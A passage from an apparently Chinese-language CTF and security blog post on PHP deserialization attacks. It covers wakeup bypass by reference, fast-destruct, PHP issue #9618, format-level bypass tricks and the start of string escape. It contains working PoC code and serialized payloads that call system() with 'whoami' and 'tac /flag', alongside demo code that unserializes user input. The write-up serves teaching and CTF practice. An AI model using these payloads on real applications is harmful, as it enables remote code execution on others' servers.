</span></span><span class=line><span class=cl><span class=nv>$bbb</span><span class=o>=</span><span class=nx>unserialize</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;a&#39;</span><span class=p>]);</span>
</span></span></code></pre></td></tr></table></div></div><p>这里很明显的口子可以进行RCE，但是wakeup会赋值为空，所以我们采取一些手段使得值相同</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>test</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$a</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$b</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$c</span><span class=p>;</span>  
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>test</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>a</span><span class=o>=</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>b</span><span class=o>=&amp;</span><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>a</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$a</span><span class=o>-&gt;</span><span class=na>b</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=c1>//1
</span></span></span></code></pre></td></tr></table></div></div><p>我这里也是成功的利用地址将值赋值相同</p><p>因为最后销毁时会将<code>c</code>的地址赋值给<code>b</code>，那么写<code>poc</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>test</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$a</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$b</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$c</span><span class=p>;</span>  
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>test</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>c</span><span class=o>=</span><span class=s2>&#34;system(&#39;whoami&#39;);&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>a</span><span class=o>=&amp;</span><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>b</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=fast-destruct>fast-destruct</h3><ul><li>在PHP中如果单独执行<code>unserialize()</code>函数，则反序列化后得到的生命周期仅限于这个函数执行的生命周期，在执行完unserialize()函数时就会执行<code>__destruct()</code>方法</li><li>而如果将<code>unserialize()</code>函数执行后得到的字符串赋值给了一个变量，则反序列化的对象的生命周期就会变长，会一直到对象被销毁才执行<code>__destruct()</code></li></ul><p><strong>[DASCTF X GFCTF 2022十月挑战赛！]EasyPOP</strong></p><p>只讲解如何绕过,写个poc</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>fine</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$cmd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$content</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>show</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$ctf</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$time</span> <span class=o>=</span> <span class=s2>&#34;Two and a half years&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>sorry</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$password</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$hint</span> <span class=o>=</span> <span class=s2>&#34;hint is depend on you&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$key</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>secret_code</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$code</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$Fine</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>fine</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$Show</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>show</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$Sorry1</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>sorry</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$Sorry2</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>sorry</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$Secret</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>secret_code</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$Sorry1</span><span class=o>-&gt;</span><span class=na>name</span> <span class=o>=</span> <span class=s1>&#39;cc&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$Sorry1</span><span class=o>-&gt;</span><span class=na>password</span> <span class=o>=</span> <span class=s1>&#39;cc&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$Sorry1</span><span class=o>-&gt;</span><span class=na>hint</span> <span class=o>=</span> <span class=nv>$Show</span><span class=p>;</span>     <span class=c1>//到class show
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$Show</span><span class=o>-&gt;</span><span class=na>ctf</span> <span class=o>=</span> <span class=nv>$Secret</span><span class=p>;</span>     <span class=c1>//触发secret_code.show()
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$Secret</span><span class=o>-&gt;</span><span class=na>code</span> <span class=o>=</span> <span class=nv>$Sorry2</span><span class=p>;</span>        <span class=c1>//触发__get()
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$Sorry2</span><span class=o>-&gt;</span><span class=na>key</span> <span class=o>=</span> <span class=nv>$Fine</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$Fine</span><span class=o>-&gt;</span><span class=na>cmd</span> <span class=o>=</span> <span class=s1>&#39;system&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$Fine</span><span class=o>-&gt;</span><span class=na>content</span> <span class=o>=</span> <span class=s1>&#39;tac /flag&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span> <span class=o>=</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$Sorry1</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$a</span>
</span></span><span class=line><span class=cl><span class=o>/*</span>
</span></span><span class=line><span class=cl><span class=nx>O</span><span class=o>:</span><span class=mi>5</span><span class=o>:</span><span class=s2>&#34;sorry&#34;</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;name&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=s2>&#34;cc&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>8</span><span class=o>:</span><span class=s2>&#34;password&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=s2>&#34;cc&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;hint&#34;</span><span class=p>;</span><span class=nx>O</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;show&#34;</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;ctf&#34;</span><span class=p>;</span><span class=nx>O</span><span class=o>:</span><span class=mi>11</span><span class=o>:</span><span class=s2>&#34;secret_code&#34;</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;code&#34;</span><span class=p>;</span><span class=nx>O</span><span class=o>:</span><span class=mi>5</span><span class=o>:</span><span class=s2>&#34;sorry&#34;</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;name&#34;</span><span class=p>;</span><span class=nx>N</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>8</span><span class=o>:</span><span class=s2>&#34;password&#34;</span><span class=p>;</span><span class=nx>N</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;hint&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>21</span><span class=o>:</span><span class=s2>&#34;hint is depend on you&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;key&#34;</span><span class=p>;</span><span class=nx>O</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;fine&#34;</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;cmd&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>6</span><span class=o>:</span><span class=s2>&#34;system&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>7</span><span class=o>:</span><span class=s2>&#34;content&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>9</span><span class=o>:</span><span class=s2>&#34;tac /flag&#34;</span><span class=p>;}}}</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;time&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>20</span><span class=o>:</span><span class=s2>&#34;Two and a half years&#34;</span><span class=p>;}</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;key&#34;</span><span class=p>;</span><span class=nx>N</span><span class=p>;}</span>
</span></span></code></pre></td></tr></table></div></div><p>方法有两种</p><p><strong>删除末尾的花括号、数组对象占用指针(改数字)</strong></p><p>本次环境中有两种方法</p><ul><li>删除最后一个}</li><li>修改任意类属性数量</li></ul><p>都可以达到<code>fast-destruct</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>O:5:&#34;sorry&#34;:4:{s:4:&#34;name&#34;;s:2:&#34;cc&#34;;s:8:&#34;password&#34;;s:2:&#34;cc&#34;;s:4:&#34;hint&#34;;O:4:&#34;show&#34;:2:{s:3:&#34;ctf&#34;;O:11:&#34;secret_code&#34;:1:{s:4:&#34;code&#34;;O:5:&#34;sorry&#34;:4:{s:4:&#34;name&#34;;N;s:8:&#34;password&#34;;N;s:4:&#34;hint&#34;;s:21:&#34;hint is depend on you&#34;;s:3:&#34;key&#34;;O:4:&#34;fine&#34;:2:{s:3:&#34;cmd&#34;;s:6:&#34;system&#34;;s:7:&#34;content&#34;;s:9:&#34;tac /flag&#34;;}}}s:4:&#34;time&#34;;s:20:&#34;Two and a half years&#34;;}s:3:&#34;key&#34;;N;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>O:5:&#34;sorry&#34;:4:{s:4:&#34;name&#34;;s:2:&#34;cc&#34;;s:8:&#34;password&#34;;s:2:&#34;cc&#34;;s:4:&#34;hint&#34;;O:4:&#34;show&#34;:2:{s:3:&#34;ctf&#34;;O:11:&#34;secret_code&#34;:1:{s:4:&#34;code&#34;;O:5:&#34;sorry&#34;:4:{s:4:&#34;name&#34;;N;s:8:&#34;password&#34;;N;s:4:&#34;hint&#34;;s:21:&#34;hint is depend on you&#34;;s:3:&#34;key&#34;;O:4:&#34;fine&#34;:4:{s:3:&#34;cmd&#34;;s:6:&#34;system&#34;;s:7:&#34;content&#34;;s:9:&#34;tac /flag&#34;;}}}s:4:&#34;time&#34;;s:20:&#34;Two and a half years&#34;;}s:3:&#34;key&#34;;N;}
</span></span></code></pre></td></tr></table></div></div><p>这里只写两种来做示范，而要深究其原理那么得涉及到GC回收机制，这个单独写一篇，因为确实挺有意思(简单的看了看网上的文章)</p><h3 id=php-issue9618>php issue#9618</h3><p>当序列化字符串中的属性名或属性值的长度不一致时，PHP会继续反序列化，但会先触发 <code>__destruct()</code> 而不是 <code>__wakeup()</code></p><ul><li>7.4.x -7.4.30</li><li>8.0.x</li></ul><p>那么借用狗神的Demo来测试一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> 
</span></span><span class=line><span class=cl><span class=nx>show_source</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>You</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$info</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$end</span><span class=o>=</span><span class=s2>&#34;1&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>info</span><span class=o>-&gt;</span><span class=na>func</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;destruct被调用</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Me</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$znd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__wakeup</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>znd</span><span class=o>=</span><span class=s2>&#34;exit();&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;wakeup被调用</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__call</span><span class=p>(</span><span class=nv>$method</span><span class=p>,</span> <span class=nv>$args</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;call被调用</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;a&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>    <span class=o>@</span><span class=nx>unserialize</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;a&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>pop链子是</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>You::destruct-&gt;Me::call
</span></span></code></pre></td></tr></table></div></div><p>那么我们写个<code>poc</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>You</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$info</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$end</span><span class=o>=</span><span class=s2>&#34;1&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Me</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$znd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>You</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>info</span><span class=o>=</span><span class=k>new</span> <span class=nx>Me</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/php-deserialization-pop/QQ20240908-185334.png width=1061 height=891 srcset="/p/php-deserialization-pop/QQ20240908-185334_hu_59255fb9863cd2cc.png 480w, /p/php-deserialization-pop/QQ20240908-185334_hu_3acc2ef2a74528f0.png 1024w" loading=lazy alt=3 class=gallery-image data-flex-grow=119 data-flex-basis=285px></p><p>成功绕过<code>wakeup</code>,那么如果我们补上空白符呢，结果可想而知</p><p><img src=/p/php-deserialization-pop/QQ20240908-185455.png width=1008 height=936 srcset="/p/php-deserialization-pop/QQ20240908-185455_hu_fa8541eaaa8a003f.png 480w, /p/php-deserialization-pop/QQ20240908-185455_hu_e84330cb83c16c38.png 1024w" loading=lazy alt=4 class=gallery-image data-flex-grow=107 data-flex-basis=258px></p><p>没有绕过</p><p>但是同样的我们使得另外一个属性值长度不一致时也可以绕过</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>a=O:3:&#34;You&#34;:2:{s:4:&#34;info&#34;;O:2:&#34;Me&#34;:1:{s:3:&#34;znd&#34;;N;}s:8:&#34;%00You%00end&#34;;s:2:&#34;1&#34;;}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>a=O:3:&#34;You&#34;:2:{s:4:&#34;info&#34;;O:2:&#34;Me&#34;:1:{s:3:&#34;znd&#34;;N;}s:8:&#34;%00You%00end&#34;;s:1:&#34;12&#34;;}
</span></span></code></pre></td></tr></table></div></div><h2 id=bypass-tips>bypass tips</h2><p>原始payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>O:2:&#34;Me&#34;:2:{s:4:&#34;name&#34;;s:3:&#34;bao&#34;;s:3:&#34;age&#34;;s:2:&#34;18&#34;;}
</span></span></code></pre></td></tr></table></div></div><h3 id=追加任意字符串>追加任意字符串</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> 
</span></span><span class=line><span class=cl><span class=nv>$data</span><span class=o>=</span><span class=s1>&#39;O:2:&#34;Me&#34;:2:{s:4:&#34;name&#34;;s:3:&#34;bao&#34;;s:3:&#34;age&#34;;s:2:&#34;18&#34;;}baozongwi//&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>var_dump</span><span class=p>(</span><span class=nx>unserialize</span><span class=p>(</span><span class=nv>$data</span><span class=p>));</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=长度前面添加0>长度前面添加0</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> 
</span></span><span class=line><span class=cl><span class=nv>$data</span><span class=o>=</span><span class=s1>&#39;O:2:&#34;Me&#34;:2:{s:004:&#34;name&#34;;s:3:&#34;bao&#34;;s:00003:&#34;age&#34;;s:2:&#34;18&#34;;}&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>var_dump</span><span class=p>(</span><span class=nx>unserialize</span><span class=p>(</span><span class=nv>$data</span><span class=p>));</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=s数据类型的字符串hex编码>S数据类型的字符串Hex编码</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> 
</span></span><span class=line><span class=cl><span class=nv>$data</span><span class=o>=</span><span class=s1>&#39;O:2:&#34;Me&#34;:2:{S:4:&#34;\6e\61\6d\65&#34;;s:3:&#34;bao&#34;;s:3:&#34;age&#34;;s:2:&#34;18&#34;;}&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>var_dump</span><span class=p>(</span><span class=nx>unserialize</span><span class=p>(</span><span class=nv>$data</span><span class=p>));</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=任意两个字符替换o之后的>任意两个字符替换O之后的<code>:{</code></h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> 
</span></span><span class=line><span class=cl><span class=nv>$data</span><span class=o>=</span><span class=s1>&#39;O:2:&#34;Me&#34;:2XXS:4:&#34;name&#34;;s:3:&#34;bao&#34;;s:3:&#34;age&#34;;s:2:&#34;18&#34;;}&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>var_dump</span><span class=p>(</span><span class=nx>unserialize</span><span class=p>(</span><span class=nv>$data</span><span class=p>));</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=数字前面添加>数字前面添加<code>+</code></h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> 
</span></span><span class=line><span class=cl><span class=nv>$data</span><span class=o>=</span><span class=s1>&#39;O:2:&#34;Me&#34;:2:{S:4:&#34;name&#34;;s:3:&#34;bao&#34;;s:3:&#34;age&#34;;s:2:&#34;18&#34;;}&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=nx>preg_replace</span><span class=p>(</span><span class=s1>&#39;/O:/&#39;</span><span class=p>,</span><span class=s1>&#39;O:+&#39;</span><span class=p>,</span><span class=nv>$data</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$a</span><span class=o>.</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=字符串逃逸>字符串逃逸</h2><p>这个可谓是常用的姿势了，那么原理是什么呢，为什么要逃逸字符串呢</p><blockquote><p>php在反序列化时，底层代码是以<code>;</code>作为字段的分隔，以<code>}</code>作为结尾，并且是<strong>根据长度判断内容</strong> ，同时反序列化的过程中必须严格按照序列化规则才能成功实现反序列化 。</p></blockquote><p>这句话其实也就暗示了我们逃逸字符的目的以及操作就是进行<strong>闭合</strong>然后插入我们需要被反序列化的字符来成功攻击,而闭合我们需要知道一个前置知识</p><blockquote><p>反序列化字符串都是以<code>";}</code>结束的</p></blockquote><p>而为什么要逃逸字符呢，就是因为某些开发者，为了安全，进行了一下正则的匹配或者是替换又或者是使用了一些自定义函数来进行解决，但是实际上是可以利用逃逸字符达到反序列化目的，这就是其原因</p><h3 id=字符增多>字符增多</h3><p>demo</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
